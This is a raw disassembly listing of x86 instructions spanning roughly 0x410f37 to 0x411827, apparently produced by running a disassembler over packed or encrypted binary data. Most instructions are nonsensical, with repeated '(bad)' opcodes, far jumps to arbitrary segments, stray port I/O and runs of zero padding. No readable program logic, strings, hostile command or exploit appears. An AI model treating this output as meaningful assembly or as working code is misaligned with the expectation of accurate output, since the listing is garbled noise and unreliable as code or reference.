  410f37:	ficomp WORD PTR fs:[esi-0x390ff103]
  410f3e:	inc    BYTE PTR [eax]
  410f40:	or     eax,0x47fffcb0
  410f45:	jmp    0xf629:0xb74737ec
  410f4c:	cdq    
  410f4d:	test   DWORD PTR [edx-0x1646e802],esp
  410f53:	aaa    
  410f54:	dec    esi
  410f55:	pop    es
  410f56:	mov    dh,0x84
  410f58:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  410f5a:	cld    
  410f5b:	inc    DWORD PTR [edi]
  410f5d:	xchg   edx,eax
  410f5e:	data16 jae 0x410fac
  410f61:	inc    ecx
  410f62:	dec    BYTE PTR [ebp+ebx*4+0xfffcbb]
	...
  410f79:	add    BYTE PTR [eax],al
  410f7b:	add    bh,al
  410f7d:	xchg   ecx,eax
  410f7e:	out    0x41,al
  410f80:	fild   DWORD PTR [ecx]
  410f82:	add    BYTE PTR [ebx-0x7a730264],al
  410f88:	xchg   edx,eax
  410f89:	mov    bh,0xfd
  410f8b:	jmp    DWORD PTR [eax]
  410f8d:	mov    bh,0xb3
  410f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f90:	(bad)  
  410f91:	mov    eax,0xedafe8fd
  410f96:	(bad)  
  410f97:	dec    DWORD PTR [ecx-0x2a]
  410f9a:	mov    ds:0x44b847fe,al
  410f9f:	and    DWORD PTR [esi],0x51
  410fa2:	jo     0x410f68
  410fa4:	pop    ss
  410fa5:	xchg   dl,dh
  410fa7:	inc    BYTE PTR [edi]
  410fa9:	mov    eax,0xb742b4e6
  410fae:	std    
  410faf:	(bad)  
  410fb0:	sbb    eax,0xf7fffc79
  410fb5:	add    BYTE PTR [eax],al
  410fb7:	add    BYTE PTR [eax+0xd8d0063],dl
  410fbd:	jns    0x410fbb
  410fbf:	jmp    DWORD PTR [edi]
  410fc1:	xchg   ecx,eax
  410fc2:	std    
  410fc3:	mov    ch,0x4c
  410fc5:	mov    bh,0xfd
  410fc7:	dec    DWORD PTR [eax+0x57]
  410fca:	das    
  410fcb:	(bad)  
  410fcc:	cmp    esi,ebp
  410fce:	or     eax,eax
  410fd0:	inc    esi
  410fd1:	fistp  DWORD PTR [edx-0x1]
  410fd4:	dec    esi
  410fd5:	cmp    DWORD PTR [si+0x5581],0x70ecfe56
  410fde:	add    al,BYTE PTR [eax]
	...
  410ff4:	inc    esi
  410ff5:	fsubr  QWORD PTR [edx-0x1]
  410ff8:	xchg   DWORD PTR cs:[si+0x3522],eax
  410ffe:	push   esi
  410fff:	dec    BYTE PTR [ecx+0x3900ffbf]
  411005:	addr16 push 0xffffffe3
  411008:	inc    eax
  411009:	add    cl,BYTE PTR [bp+di]
  41100c:	stc    
  41100d:	gs jle 0x410fde
  411010:	cmp    DWORD PTR [edi+0x2],esp
  411013:	cmp    eax,0x2683d
  411018:	ds out 0x3f,al
  41101b:	jmp    esi
  41101d:	pushw  0x4f
  411020:	xor    esp,DWORD PTR [edi+0x2]
  411023:	push   eax
  411024:	popa   
  411025:	push   ebx
  411026:	leave  
  411027:	inc    eax
  411028:	cmp    esp,ecx
  41102a:	add    cl,0xc7
  41102d:	aad    0x56
  41102f:	dec    edi
  411030:	rol    edx,1
  411032:	or     DWORD PTR [eax],eax
  411034:	cmp    edx,ebp
  411036:	aas    
  411037:	or     esp,DWORD PTR [ebx]
  411039:	xchg   DWORD PTR [si-0x4b5e],eax
  41103e:	push   esi
  41103f:	dec    BYTE PTR [ecx]
  411041:	mov    edi,0x673908a6
  411046:	xchg   DWORD PTR [edx+edx*4-0x1601a944],eax
  41104d:	scas   al,BYTE PTR es:[edi]
  41104e:	adc    eax,DWORD PTR [ebx+0x7e]
  411051:	or     eax,0x6ecc00b
  411056:	in     al,dx
  411057:	in     eax,0x0
	...
  411069:	add    BYTE PTR [eax],al
  41106b:	add    BYTE PTR [ecx],ah
  41106d:	add    BYTE PTR [eax+0x217ab403],ch
  411073:	push   esi
  411074:	pop    edi
  411075:	push   esp
  411076:	mov    eax,0xe18816b
  41107b:	push   edi
  41107c:	mov    ebp,0x47562a6a
  411081:	push   esp
  411082:	call   0x3756:0xb4ef56b3
  411089:	push   0x3eb588d9
  41108e:	out    0x56,al
  411090:	daa    
  411091:	mov    cl,0x6b
  411093:	and    BYTE PTR [ebx],0x53
  411096:	aad    0x56
  411098:	xchg   BYTE PTR [eax-0x7b],ch
  41109b:	sbb    cl,BYTE PTR [esi]
  41109d:	push   esp
  41109e:	outs   dx,DWORD PTR ds:[esi]
  41109f:	add    dl,0x52
  4110a2:	mov    ebp,0x748dff56
  4110a7:	push   ebp
  4110a8:	not    DWORD PTR [ebx-0x53]
  4110ab:	nop
  4110ac:	jmp    0xd9cc:0xde56a552
  4110b3:	push   esi
  4110b4:	fild   WORD PTR [edi]
  4110b6:	test   eax,0x10e80bcf
  4110bb:	retf   
  4110bc:	jns    0x4110be
  4110be:	xchg   ecx,eax
  4110bf:	pop    esi
  4110c0:	ds add cl,ch
  4110c3:	mov    bl,0x56
  4110c5:	fsub   DWORD PTR [ecx]
  4110c7:	lds    esi,FWORD PTR [esi-0x5360ccae]
  4110cd:	push   ebx
  4110ce:	imul   eax,DWORD PTR gs:[eax],0x0
	...
  4110e2:	add    BYTE PTR [eax],al
  4110e4:	scas   eax,DWORD PTR es:[edi]
  4110e5:	mov    edi,0x110565d
  4110ea:	ret    
  4110eb:	add    esp,DWORD PTR [ebx]
  4110ed:	add    BYTE PTR [esi-0x70],cl
  4110f0:	rcl    BYTE PTR [edx+0x45],cl
  4110f3:	push   esi
  4110f4:	push   ds
  4110f5:	ror    BYTE PTR [edi],1
  4110f7:	lds    edi,FWORD PTR [esi-0x17]
  4110fa:	(bad)  
  4110fb:	call   0xe94acfe2
  411100:	cmp    dl,BYTE PTR [ebx-0x4c]
  411103:	gs or  al,0x52
  411106:	(bad)  
  411107:	adc    DWORD PTR [edi-0x10e900f6],edx
  41110d:	mov    esp,DWORD PTR [ebx-0x18ae18f1]
  411113:	dec    ebp
  411114:	aaa    
  411115:	push   ebx
  411116:	(bad)  
  411117:	(bad)  
  411118:	scas   al,BYTE PTR es:[edi]
  411119:	dec    edi
  41111a:	std    
  41111b:	test   BYTE PTR [ebx+ebx*2+0x5287be05],0xfb
  411123:	sbb    bh,BYTE PTR [ebp-0x68]
  411126:	(bad)  
  411127:	fiadd  WORD PTR [edx+edx*2-0x4ca780f]
  41112e:	push   cs
  41112f:	fs ds push edx
  411132:	inc    dh
  411134:	iret   
  411135:	mov    cl,0xc8
  411137:	stos   BYTE PTR es:[edi],al
  411138:	into   
  411139:	test   ebx,ebp
  41113b:	push   0x79
  41113d:	arpl   WORD PTR [edi-0x14],sp
  411140:	pop    ebx
  411141:	adc    eax,DWORD PTR [eax]
  411143:	mov    eax,ds:0x9ec3000b
	...
  41115c:	mov    al,0x30
  41115e:	addr16 in al,dx
  411160:	cmp    eax,DWORD PTR [eax]
  411162:	add    BYTE PTR [ecx-0x7900f619],al
  411168:	mov    al,0x30
  41116a:	mov    BYTE PTR [ecx+eiz*2],ah
  41116d:	xchg   cl,dl
  41116f:	add    DWORD PTR [esi+0x22e8ffff],esi
  411175:	in     al,0x36
  411177:	data16 or al,0x86
  41117a:	shl    DWORD PTR [eax-0x22],1
  41117d:	bound  esp,QWORD PTR [edi-0x14]
  411180:	cmp    eax,DWORD PTR [eax]
  411182:	add    BYTE PTR [ecx-0x39],al
  411185:	or     edi,edi
  411187:	add    bh,bh
  411189:	mov    al,dl
  41118b:	mov    esp,DWORD PTR [edx]
  41118d:	xchg   DWORD PTR [ebx-0x8],eax
  411190:	fisttp DWORD PTR ds:0x5278d28a
  411196:	(bad)  
  411197:	call   DWORD PTR [eax-0x55]
  41119a:	jae    0x411198
  41119c:	retf   0xe7fe
  41119f:	sbb    ebx,DWORD PTR [ecx-0x2]
  4111a2:	dec    DWORD PTR [edx-0x2f76ee]
  4111a8:	lds    ebp,FWORD PTR [esi-0x1aefb9a]
  4111ae:	jmp    edi
  4111b0:	stos   BYTE PTR es:[edi],al
  4111b1:	add    eax,0xbe1b0000
  4111b6:	jb     0x4111c7
  4111b8:	stos   DWORD PTR es:[edi],eax
  4111b9:	packuswb mm7,QWORD PTR [ebp+0x6b]
  4111bd:	cmp    eax,0xfefe
	...
  4111d2:	add    BYTE PTR [eax],al
  4111d4:	jne    0x411182
  4111d6:	out    0x31,al
  4111d8:	sbb    dh,bh
  4111da:	dec    DWORD PTR [edx+0x69fe67a2]
  4111e0:	adc    BYTE PTR [eax+0x0],ch
  4111e3:	push   0xffffffe0
  4111e5:	add    DWORD PTR [bx+si-0x20],ebp
  4111e9:	std    
  4111ea:	(bad)  
  4111eb:	mov    edi,0xe8ee429f
  4111f0:	pushf  
  4111f1:	push   esp
  4111f2:	(bad)  
  4111f3:	call   FWORD PTR [ecx-0x6e]
  4111f6:	repnz inc eax
  4111f8:	fstp   TBYTE PTR [ebp+0x42bf4473]
  4111fe:	cli    
  4111ff:	inc    ebp
  411201:	lods   eax,DWORD PTR ds:[esi]
  411202:	out    0xff,al
  411204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411205:	std    
  411206:	jmp    FWORD PTR [ecx+0x3c]
  411209:	data16 (bad) 
  41120b:	inc    BYTE PTR [ebp-0x568c1953]
  411211:	std    
  411212:	dec    DWORD PTR [edx]
  411214:	cmp    DWORD PTR [edi],esp
  411216:	iret   
  411217:	or     edi,ecx
  411219:	ds aad 0x4a
  41121c:	clc    
  41121d:	data16 mov dl,0xe7
  411220:	call   0xe866:0xe300025a
  411227:	jmp    eax
  411229:	fs call 0xeaa6e32e
  41122f:	call   FWORD PTR [esi+0x67]
  411232:	inc    edx
  411233:	dec    ah
  411235:	imul   BYTE PTR [edx-0x6b]
	...
  41124c:	add    cl,BYTE PTR ss:[bx+di+0x52fc]
  411252:	shl    DWORD PTR [ebx-0x2e],0x6e
  411256:	jge    0x4112a2
  411258:	js     0x4112c1
  41125a:	push   0xffffff9d
  41125c:	add    dl,BYTE PTR ss:[bx+si-0x6f]
  411261:	in     al,0xbe
  411263:	inc    eax
  411264:	cmp    DWORD PTR [edx],esi
  411266:	fdiv   st,st(3)
  411268:	and    DWORD PTR [ecx+0x170eff14],ebx
  41126e:	push   ebx
  41126f:	je     0x41127e
  411271:	das    
  411272:	into   
  411273:	push   es
  411274:	cmp    DWORD PTR [edi-0x56],esp
  411277:	or     bh,cl
  411279:	adc    eax,DWORD PTR [esi]
  41127b:	jmp    0x4112f7
  41127d:	mov    ds:0x8c51fbd8,al
  411282:	mov    esi,0xd8723940
  411287:	mul    ecx
  411289:	mov    dl,0xfb
  41128b:	dec    esi
  41128d:	in     eax,0x47
  41128f:	or     edx,DWORD PTR [ecx-0x7e]
  411292:	mov    esi,0x946f3940
  411297:	push   es
  411298:	cmp    DWORD PTR [edi-0x3],esp
  41129b:	mov    edi,0xd8da4525
  4112a0:	bnd jmp DWORD PTR [edi-0x6f97f6fd]
  4112a7:	or     edi,DWORD PTR [ecx]
  4112a9:	add    dl,ah
  4112ab:	inc    ebx
  4112ac:	or     ch,ch
  4112ae:	ret    0x3
	...
  4112c1:	add    BYTE PTR [eax],al
  4112c3:	add    BYTE PTR [ebx],dl
  4112c5:	add    BYTE PTR [esi-0x27],al
  4112c8:	xchg   BYTE PTR [eax-0x4d],dl
  4112cb:	push   ebx
  4112cc:	fmulp  st(7),st
  4112ce:	inc    esp
  4112d0:	outs   dx,BYTE PTR ds:[esi]
  4112d1:	out    0xe8,al
  4112d3:	push   edx
  4112d4:	jbe    0x411326
  4112d6:	fwait
  4112d7:	dec    edi
  4112d8:	push   esi
  4112d9:	push   cs
  4112da:	xlat   BYTE PTR ds:[ebx]
  4112db:	push   edx
  4112dc:	push   edi
  4112dd:	push   eax
  4112de:	fwait
  4112df:	push   ebx
  4112e0:	push   esi
  4112e1:	xlat   BYTE PTR es:[ebx]
  4112e3:	push   edx
  4112e4:	inc    edi
  4112e5:	push   eax
  4112e6:	jnp    0x411333
  4112e8:	push   esi
  4112e9:	push   ds
  4112ea:	mov    bh,0x52
  4112ec:	aaa    
  4112ed:	cmp    ch,BYTE PTR [ecx]
  4112ef:	mov    ebx,0x664bd88b
  4112f4:	data16 add cl,ah
  4112f7:	aad    0x39
  4112f9:	inc    ebx
  4112fa:	fisttp QWORD PTR [esi+0x3e90039]
  411300:	into   
  411301:	std    
  411302:	sbb    al,0xc5
  411304:	push   es
  411305:	(bad)  
  411307:	mov    edx,0x53249216
  41130c:	mul    DWORD PTR [ebx]
  41130e:	xchg   ecx,eax
  41130f:	dec    edi
  411310:	sub    eax,DWORD PTR [eax+0x6f]
  411313:	push   edx
  411314:	out    0x4f,eax
  411316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411317:	push   ebp
  411318:	mov    WORD PTR [eax],cs
  41131a:	out    0xd8,al
  41131c:	fidivr WORD PTR [ebx-0x57]
  41131f:	scas   al,BYTE PTR es:[edi]
  411320:	outs   dx,DWORD PTR ds:[esi]
  411321:	inc    ebx
  411322:	xor    edi,DWORD PTR [edi-0x2e]
  411325:	sub    DWORD PTR [ebx+edx*2+0x0],0x0
	...
  411339:	add    BYTE PTR [eax],al
  41133b:	add    BYTE PTR [ebx-0x28],ch
  41133e:	xchg   ebx,eax
  41133f:	gs jbe 0x411342
  411342:	add    BYTE PTR [ecx-0x7c],dh
  411345:	add    bl,al
  411347:	outs   dx,BYTE PTR ds:[esi]
  411348:	mov    edi,0x7417ff0c
  41134d:	dec    edi
  41134e:	(bad)  
  41134f:	aad    0x8c
  411351:	cmp    BYTE PTR [esi+ebp*8],0x5b
  411355:	sar    edi,0xe8
  411358:	outs   dx,BYTE PTR ds:[esi]
  411359:	clc    
  41135a:	add    BYTE PTR [esi+edi*2],0x1e
  41135e:	inc    ecx
  41135f:	jmp    0x245e89e
  411364:	cmc    
  411365:	test   eax,0x2b472ac8
  41136a:	out    0xcd,eax
  41136c:	xor    eax,DWORD PTR [eax]
  41136e:	add    BYTE PTR [ecx+edx*4+0x4b],ch
  411372:	push   ecx
  411373:	adc    DWORD PTR [edx-0x41],0xfffffffe
  411377:	hlt    
  411378:	jmp    0x411396
  41137a:	inc    ecx
  41137b:	jmp    0x654fa2bf
  411380:	stos   BYTE PTR es:[edi],al
  411381:	dec    edi
  411382:	(bad)  
  411383:	jmp    0xea38d80b
  411388:	cmp    al,BYTE PTR [eax]
  41138a:	add    BYTE PTR [esi+esi*8+0x56],dh
  41138e:	dec    edi
  41138f:	push   ebx
  411390:	cmp    eax,0x3a42ffda
  411395:	dec    edi
  411396:	je     0x411365
  411398:	push   0xfa1606f4
  41139d:	dec    esi
  41139e:	or     DWORD PTR [ecx+0x0],ebp
	...
  4113b4:	push   cs
  4113b5:	(bad)  
  4113b7:	cmp    DWORD PTR [eax+0x0],eax
  4113ba:	add    BYTE PTR [edx+0x75],ch
  4113bd:	leave  
  4113be:	je     0x4113c9
  4113c0:	mov    ah,0xcb
  4113c2:	imul   ecx
  4113c4:	out    dx,al
  4113c5:	test   al,0xfe
  4113c7:	sbb    al,0x7d
  4113c9:	addr16 jg 0x4113a0
  4113cc:	imul   ecx,DWORD PTR [esi-0x78],0x8ba80d00
  4113d3:	inc    ebp
  4113d4:	mov    eax,0x2875fd93
  4113d9:	mov    cl,0x73
  4113db:	hlt    
  4113dc:	cmp    al,BYTE PTR [ebx]
  4113de:	push   DWORD PTR [ebp+0x14]
  4113e1:	mov    cl,0x13
  4113e3:	pop    es
  4113e4:	inc    edi
  4113e5:	inc    ebx
  4113e6:	dec    BYTE PTR [edx]
  4113e8:	pusha  
  4113e9:	sub    BYTE PTR [ebx+ecx*4],ch
  4113ec:	fnsave [esi+0x47051089]
  4113f2:	out    dx,al
  4113f3:	push   eax
  4113f4:	shr    BYTE PTR [edi+0x43370b13],cl
  4113fa:	dec    BYTE PTR [edx]
  4113fc:	adc    BYTE PTR [eax],ch
  4113fe:	sbb    BYTE PTR [eax+0x50],ch
  411401:	mov    ?,WORD PTR [edi]
  411403:	add    BYTE PTR [edi],dh
  411405:	aaa    
  411406:	out    dx,al
  411407:	call   0x410e46
  41140c:	pop    ebx
  41140d:	ret    0x173
  411410:	xchg   ebx,eax
  411411:	scas   eax,DWORD PTR es:[edi]
  411412:	jae    0x411404
  411414:	dec    eax
  411415:	cmc    
  411416:	add    eax,0x0
	...
  41142b:	add    BYTE PTR [eax],ah
  41142d:	mov    cl,0x73
  41142f:	hlt    
  411430:	cmp    BYTE PTR [edi+0x33],al
  411433:	call   DWORD PTR [edi]
  411435:	mov    cl,0x73
  411437:	cld    
  411438:	call   0x20411a35
  41143d:	int    0xc1
  41143f:	pop    ebx
  411440:	fld    st(4)
  411442:	push   ebx
  411443:	mov    esp,esp
  411445:	add    dl,0xc0
  411448:	mov    dh,0xb0
  41144a:	std    
  41144b:	push   ebx
  41144c:	js     0x4114cc
  41144e:	loope  0x411490
  411450:	sar    BYTE PTR [ecx-0x4f6cfe90],1
  411456:	cmp    DWORD PTR ds:0x40eaf0,0x1ad65739
  411460:	mov    edx,0x7829163c
  411465:	push   edi
  411466:	add    dh,BYTE PTR [ebx+ecx*2-0x26]
  41146a:	or     eax,0x4185fff
  41146f:	add    BYTE PTR ds:0x3a3c8360,ch
  411475:	test   dl,0xff
  411478:	xchg   esi,eax
  411479:	xor    al,0x5
  41147b:	sub    edi,DWORD PTR [ecx-0x6e]
  41147e:	cmp    edx,eax
  411480:	push   edx
  411481:	adc    dl,BYTE PTR [eax+0x14]
  411484:	dec    ecx
  411485:	lock ret 0xc1ff
  411489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148a:	push   esi
  41148b:	(bad)  
  41148c:	mov    ah,0x23
  41148e:	push   ecx
  41148f:	inc    BYTE PTR [eax]
	...
  4114a1:	add    BYTE PTR [eax],al
  4114a3:	add    BYTE PTR [esi-0x1],ah
  4114a6:	add    al,BYTE PTR [eax]
  4114a8:	cmp    DWORD PTR [ecx+0x2],esi
  4114ab:	push   0x3b
  4114ad:	out    dx,eax
  4114ae:	cdq    
  4114af:	add    eax,0xf7835739
  4114b4:	inc    esi
  4114b5:	xchg   BYTE PTR cs:0x89025738,bl
  4114bc:	mov    esp,0x2efe510e
  4114c1:	in     al,0x85
  4114c3:	retf   
  4114c4:	daa    
  4114c5:	pop    esi
  4114c6:	dec    esi
  4114c7:	dec    edi
  4114c8:	push   ds
  4114c9:	ins    BYTE PTR es:[edi],dx
  4114ca:	cmp    edi,ebp
  4114cc:	push   ss
  4114cd:	cs pop ebx
  4114cf:	lea    esi,[edi]
  4114d1:	push   edi
  4114d2:	add    cl,BYTE PTR [ebx]
  4114d4:	stc    
  4114d5:	sub    eax,0x5739f286
  4114da:	add    ch,BYTE PTR [eax-0x16]
  4114dd:	adc    ebp,eax
  4114df:	(bad)  
  4114e0:	mov    ebp,0xe6fd53db
  4114e5:	popf   
  4114e6:	mov    bl,0xe7
  4114e8:	dec    eax
  4114e9:	add    dh,ch
  4114eb:	add    edi,DWORD PTR [ecx]
  4114ed:	stc    
  4114ee:	test   al,0xff
  4114f0:	mov    edx,0x3903e840
  4114f5:	inc    ebp
  4114f6:	arpl   WORD PTR [eax-0x44],cx
  4114f9:	dec    esp
  4114fa:	test   DWORD PTR [ecx+edi*1],eax
  4114fd:	add    cl,ch
  4114ff:	xor    BYTE PTR [ebp-0x58b089bd],0xaf
  411506:	ins    DWORD PTR es:[edi],dx
  411507:	cdq    
	...
  41151c:	mov    cl,BYTE PTR [ebp+0x65]
  41151f:	dec    edi
  411520:	xchg   edi,eax
  411521:	repnz adc al,0x1d
  411524:	clc    
  411525:	jmp    DWORD PTR [ecx+0x79]
  411528:	jp     0x411577
  41152a:	dec    ebp
  41152b:	dec    edi
  41152c:	xor    eax,DWORD PTR [eax-0xb]
  41152f:	xchg   esi,ecx
  411531:	(bad)  
  411532:	call   0x3cf4473a
  411537:	(bad)  
  411538:	mov    ebp,0x3903e87c
  41153d:	dec    ebp
  41153e:	pop    ebx
  41153f:	cmp    BYTE PTR [esp+ecx*2+0x1d],dl
  411543:	fimul  DWORD PTR [esi-0x1c]
  411546:	call   0x1434e4e
  41154b:	and    DWORD PTR [edi],esi
  41154d:	add    cl,ch
  41154f:	cli    
  411550:	not    ah
  411552:	jg     0x4115d0
  411554:	jne    0x41159e
  411556:	arpl   cx,cx
  411558:	and    dh,BYTE PTR [ecx-0x1c6a580]
  41155e:	call   0xdd89a2b1
  411563:	clc    
  411564:	bndstx [eax],(bad)
  411567:	add    al,0x32
  411569:	inc    eax
  41156a:	push   esp
  41156b:	lods   al,BYTE PTR ds:[esi]
  41156c:	call   ebp
  41156e:	les    ecx,FWORD PTR [esi+0x4d]
  411571:	dec    DWORD PTR ds:0xfff6eec5
  411577:	test   al,0xe
  411579:	or     DWORD PTR [ebx-0x5a],eax
  41157c:	mov    cl,0x8b
  41157e:	std    
  41157f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  411594:	xchg   DWORD PTR [ebx-0x2],ecx
  411597:	jmp    0xa9c592d6
  41159c:	je     0x4115e8
  41159e:	(bad)  
  41159f:	cmp    ebp,ebx
  4115a1:	or     al,BYTE PTR [eax]
  4115a3:	idiv   BYTE PTR [edx]
  4115a5:	pop    eax
  4115a6:	pop    esi
  4115a7:	out    0x3a,eax
  4115a9:	add    BYTE PTR [ebx],cl
  4115ab:	test   eax,0x2c82f481
  4115b0:	cli    
  4115b1:	dec    esp
  4115b2:	(bad)  
  4115b3:	data16 cmp dl,ah
  4115b6:	or     ebx,DWORD PTR [esi-0x4f]
  4115b9:	mov    edi,ebp
  4115bb:	push   esi
  4115bc:	idiv   DWORD PTR [ecx+0x4]
  4115bf:	aam    0x1d
  4115c1:	sar    edi,0x51
  4115c4:	dec    ebx
  4115c5:	push   edi
  4115c6:	sbb    DWORD PTR [esi],edi
  4115c8:	xchg   ecx,eax
  4115c9:	inc    edi
  4115ca:	out    0x7d,eax
  4115cc:	add    BYTE PTR ds:[eax],al
  4115cf:	adc    DWORD PTR cs:[ebx-0x19],0x3e55
  4115d7:	adc    dl,BYTE PTR [edx+0x4a]
  4115da:	je     0x4115ed
  4115dc:	loop   0x41157e
  4115de:	add    ebp,ecx
  4115e0:	cmp    bh,BYTE PTR [ebp-0x7c]
  4115e3:	xor    eax,0x99fe4a84
  4115e8:	jg     0x41157e
  4115ea:	(bad)  
  4115eb:	div    DWORD PTR [edx+ecx*2-0x19]
  4115ef:	inc    ebp
  4115f0:	xor    DWORD PTR [eax],eax
  4115f2:	add    al,dl
  4115f4:	ds dec ebx
  4115f6:	(bad)  
  4115f7:	fiadd  WORD PTR [eax]
	...
  411609:	add    BYTE PTR [eax],al
  41160b:	add    BYTE PTR [esp+edx*4-0x39],bh
  41160f:	xlat   BYTE PTR ds:[ebx]
  411610:	je     0x41165c
  411612:	out    0x69,eax
  411614:	xor    DWORD PTR [eax],eax
  411616:	add    BYTE PTR [eax],al
  411618:	imul   eax,ecx,0x59
  41161b:	leave  
  41161c:	mov    ds:0x53ec8992,eax
  411621:	mov    eax,0xfa7853de
  411626:	in     al,0x40
  411628:	loopne 0x4115e0
  41162a:	jo     0x41162d
  41162c:	mov    ds:0x9f3d81bc,eax
  411631:	jmp    0x33111676
  411636:	pop    es
  411637:	cmp    DWORD PTR [ebp+0x7],0x2d
  41163b:	inc    ecx
  41163c:	mov    al,ds:0x7b0574fe
  411641:	mov    esi,0xc4d3c959
  411646:	inc    ebx
  411647:	cld    
  411648:	mov    al,ds:0x57fffffe
  41164d:	inc    ebx
  41164e:	test   BYTE PTR [eax],0x90
  411651:	(bad)  
  411652:	inc    esi
  411654:	aad    0xaa
  411656:	(bad)  
  411657:	jmp    DWORD PTR [eax-0x2]
  41165a:	mov    BYTE PTR [ebp+0x24],0x4
  41165e:	add    BYTE PTR [eax],al
  411660:	push   eax
  411661:	ret    
  411662:	inc    ebx
  411663:	lock push eax
  411665:	(bad)  
  411666:	(bad)  
  411667:	dec    ebp
  411669:	inc    edx
  41166a:	out    dx,al
  41166b:	push   eax
  41166c:	fld    QWORD PTR [edx-0xe]
  41166f:	push   eax
	...
  411684:	fld    QWORD PTR [edx-0x16]
  411687:	push   eax
  411688:	mov    edx,0x3c458bbb
  41168d:	xchg   esp,eax
  41168e:	push   0x6a00ca02
  411693:	add    BYTE PTR [edi],ch
  411695:	push   ebx
  411696:	int    0x2e
  411698:	sar    ebp,1
  41169a:	mov    BYTE PTR [ebp-0x18],al
  41169d:	cmp    BYTE PTR [ebx-0x18],0x20
  4116a1:	xor    al,BYTE PTR [edi]
  4116a3:	cmp    DWORD PTR [ecx],0x39e95bb4
  4116a9:	push   edi
  4116aa:	add    dh,BYTE PTR [ebp+0x6d]
  4116ad:	inc    edx
  4116ae:	aad    0xfb
  4116b0:	mov    esi,0x64824c24
  4116b5:	pop    DWORD PTR [edx]
  4116b7:	je     0x41163c
  4116b9:	fisubr WORD PTR [ebp+0x4b62e2f7]
  4116bf:	jb     0x411722
  4116c1:	outs   dx,DWORD PTR ds:[esi]
  4116c2:	aad    0x41
  4116c4:	(bad)  
  4116c5:	jb     0x411740
  4116c7:	inc    esp
  4116c8:	fnstcw WORD PTR [edx+0xf]
  4116cb:	call   0xfe8e2bf2
  4116d0:	inc    edx
  4116d1:	xchg   edi,eax
  4116d2:	(bad)  
  4116d3:	and    dh,BYTE PTR [eax+0x2d69681c]
  4116d9:	jg     0x411737
  4116db:	xor    DWORD PTR [esi-0x668bb41e],edx
  4116e1:	fcmovb st,st(2)
  4116e3:	pop    es
  4116e4:	xchg   BYTE PTR [esi+eiz*2],ch
  4116e7:	mov    es,WORD PTR [eax]
	...
  4116f9:	add    BYTE PTR [eax],al
  4116fb:	add    cl,bh
  4116fd:	bound  ecx,QWORD PTR [ebx+0x34]
  411700:	dec    BYTE PTR [ebp+0x57bfffc1]
  411706:	lahf   
  411707:	inc    esi
  411708:	repnz xchg edi,eax
  41170a:	add    al,BYTE PTR [ebx+0x4c4b937a]
  411710:	gs (bad) 
  411712:	int    0xeb
  411714:	cmp    DWORD PTR [edi+eax*4-0x2],esi
  411718:	int3   
  411719:	repnz dec ebx
  41171b:	adc    al,0x72
  41171d:	mov    ecx,eax
  41171f:	(bad)  
  411720:	call   FWORD PTR [ebx+0x572eff4e]
  411726:	add    al,BYTE PTR [ecx-0xa7005c]
  41172c:	push   ds
  41172d:	push   edi
  41172e:	aad    0x4
  411730:	and    BYTE PTR [eax],al
  411732:	inc    ebp
  411733:	dec    ebx
  411734:	cmovns ebp,DWORD PTR [ecx-0x37]
  411738:	add    al,BYTE PTR [eax]
  41173a:	pop    ebp
  41173b:	std    
  41173c:	call   edx
  41173e:	int3   
  41173f:	dec    ebx
  411740:	dec    ebp
  411741:	xor    eax,0x90eec516
  411746:	out    0x3,eax
  411748:	cmp    DWORD PTR [eax],eax
  41174a:	adc    bh,BYTE PTR ds:0x5861b2fb
  411750:	mov    ebx,0x67b7bc43
  411755:	fsub   DWORD PTR [ebx]
  411757:	bound  eax,QWORD PTR [esi]
  411759:	add    BYTE PTR [ecx-0x72c2c62a],dl
  41175f:	xchg   DWORD PTR [eax],eax
	...
  411771:	add    BYTE PTR [eax],al
  411773:	add    BYTE PTR [ebp-0x3],dh
  411776:	aad    0xc4
  411778:	scas   al,BYTE PTR es:[edi]
  411779:	dec    eax
  41177a:	hlt    
  41177b:	cld    
  41177c:	mov    ebx,0xf81ae60a
  411781:	(bad)  
  411782:	call   0x29565457
  411787:	stos   DWORD PTR es:[edi],eax
  411788:	repz sub DWORD PTR ss:[edi+0x25],edi
  41178d:	shl    DWORD PTR [ecx+0x77577ec4],0x5
  411794:	cmp    DWORD PTR [eax],eax
  411796:	push   ecx
  411797:	and    BYTE PTR [ebp+0x48],ch
  41179a:	cmp    eax,0xa1b52587
  41179f:	les    ebx,FWORD PTR [esi+0x48]
  4117a2:	mov    ah,0xf2
  4117a4:	push   edi
  4117a5:	int3   
  4117a6:	in     al,dx
  4117a7:	dec    edx
  4117a8:	add    eax,0x46c4b1b5
  4117ad:	pusha  
  4117ae:	inc    esi
  4117af:	pop    es
  4117b0:	cmp    DWORD PTR [eax],eax
  4117b2:	loop   0x4117f7
  4117b4:	lods   eax,DWORD PTR ds:[esi]
  4117b5:	std    
  4117b6:	pmaxub mm7,QWORD PTR [ecx]
  4117b9:	add    cl,ch
  4117bb:	inc    edx
  4117bc:	jge    0x411802
  4117be:	(bad)  
  4117bf:	call   0x5c4117fe
  4117c4:	clc    
  4117c5:	dec    ebx
  4117c6:	dec    edi
  4117c7:	push   ebx
  4117c8:	xor    eax,0xefde01da
  4117cd:	add    ebp,DWORD PTR [edx-0x17]
  4117d0:	jae    0x4117a4
  4117d2:	add    ecx,esi
  4117d4:	jmp    0x6946cf
	...
  4117e9:	add    BYTE PTR [eax],al
  4117eb:	add    BYTE PTR ds:0x3835bffb,dh
  4117f1:	pop    ecx
  4117f2:	mov    cl,ch
  4117f4:	cmp    al,BYTE PTR [eax]
  4117f6:	(bad)  
  4117f7:	cmp    bh,BYTE PTR [ecx]
  4117f9:	pop    eax
  4117fa:	pop    ecx
  4117fb:	sub    BYTE PTR [edx+0x75248846],al
  411801:	inc    esi
  411802:	jb     0x4117f1
  411804:	bound  edx,QWORD PTR [ebp+0x1]
  411807:	jmp    0xfd3fc846
  41180c:	add    dh,BYTE PTR [edi-0x20590502]
  411812:	jmp    edi
  411814:	cmp    al,BYTE PTR [eax]
  411816:	push   0xfe4796e9
  41181b:	push   ecx
  41181c:	sbb    DWORD PTR [edx],eax
  41181e:	add    cl,ch
  411820:	xchg   DWORD PTR [edi-0x4405fd8d],eax
  411826:	sti    
  411827:	jmp    0x74411866
